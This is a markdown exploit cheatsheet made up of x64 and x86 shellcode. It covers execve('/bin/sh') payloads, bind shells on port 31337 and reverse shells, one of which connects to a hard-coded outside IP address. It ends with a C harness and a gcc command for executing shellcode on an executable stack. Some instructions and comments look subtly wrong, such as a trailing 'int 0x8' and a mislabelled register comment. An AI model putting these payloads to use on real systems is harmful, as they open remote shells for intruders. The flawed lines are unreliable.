# Exploit-Cheatsheet

## Shellcode

### `x64`

* `execve("/bin/sh", NULL, NULL)` (Null Free, 22 Bytes)

```
xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
imul esi
mov al, 0x3b
syscall
```

* Bind shell

```
BITS 64

; s = socket(2, 1, 0)
push 0x29
pop rax
cdq
push 0x2
pop rdi
push 0x1
pop rsi
syscall

; bind(s, [2, 31337, 0], 16)
xchg rax, rdi
push 0x31
pop rax
mov rbx, 0xffffffff9685fffe
neg rbx
push rbx
push rsp
pop rsi
push 0x10
pop rdx
syscall

; listen(s, 0)
push 0x32
pop rax
xor esi, esi
syscall

; c = accept(s, 0, 0)
push 0x2b
pop rax
cdq
syscall

; dup2(c, 2); dup2(c, 1); dup2(c, 0)
xchg rax, rdi
push 0x2
pop rsi
loop:
push 0x21
pop rax
syscall
dec rsi
jns loop

; execve("/bin/sh", 0, 0)
xor esi, esi
mov rbx, 0x68732f2f6e69622f
push rsi
push rbx
push rsp
pop rdi
cdq
add al, 0x3b
syscall
```

* Reverse shell

```
; s = socket(2, 1, 0)
push 0x29
pop rax ; rax = 0x66
cdq ; rdx = 0
push 0x2
pop rdi ; rdi = 2
push 0x1
pop rsi ; rsi = 1
syscall

; connect(s, [2, 31337, 178.128.18.122], 16)
xchg rax, rdi
push 0x2a
pop rax
mov rbx, 0x85ed7f4d9685fffe
neg rbx
push rbx
push rsp
pop rsi
push 0x10
pop rdx
syscall

; dup2(s, 2); dup2(s, 1); dup2(s, 0)
push 0x2
pop rsi
loop:
push 0x21
pop rax
syscall
dec rsi
jns loop

; execve("/bin/sh", 0, 0)
xor esi, esi
mov rbx, 0x68732f2f6e69622f
push rsi
push rbx
push rsp
pop rdi
cdq
add al, 0x3b
syscall
```

### `x86`

* `execve("/bin/sh", NULL, NULL)` (Null free, 22 Bytes)

```
xor eax, eax
xor ecx, ecx
cdq
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor al, 0xb
int 0x80
```

* Bind Shell

```
push   0x66
pop    eax
push   0x1
pop    ebx
xor    esi,esi
push   esi
push   ebx
push   0x2
mov    ecx,esp
int    0x80
pop    edi
xchg   edi,eax
xchg   ebx,eax
mov    al,0x66
push   esi
push   0x697a ; port 31337
push   bx
mov    ecx,esp
push   0x10
push   ecx
push   edi
mov    ecx,esp
int    0x80
mov    al,0x66
mov    bl,0x4
push   esi
push   edi
mov    ecx,esp
int    0x80
mov    al,0x66
inc    ebx
push   esi
push   esi
push   edi
mov    ecx,esp
int    0x80
pop    ecx
pop    ecx
mov    cl,0x2
xchg   ebx,eax
loop:
mov    al,0x3f
int    0x80
dec    ecx
jns    loop
mov    al,0xb
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
inc    ecx
mov    edx,ecx
int    0x80
```

* Reverse Shell

```
push 0x66
pop eax
cdq
xor ebx,ebx
inc ebx
push edx
push ebx
push 0x2
mov ecx,esp
int 0x80
pop ecx
xchg eax,ebx
loop:
mov al,0x3f
int 0x80
dec ecx
jns loop
mov al,0x66
push dword 0x101017f
push word 0x672b
push byte 0x2
mov ecx,esp
push byte +0x10
push ecx
push ebx
mov ecx,esp
int 0x80
mov al,0xb
push edx
push dword 0x68732f2f
push dword 0x6e69622f
mov ebx,esp
xor ecx,ecx
int 0x8
```

### Shellcode Testing
Source (`sc.c`)
```c
int main() {
    unsigned char shellcode[] = ""; // shellcode
    int (*run)() = (int(*)())shellcode;
    run();
}
```
Compile
```bash
gcc sc.c -z execstack -o sc
```
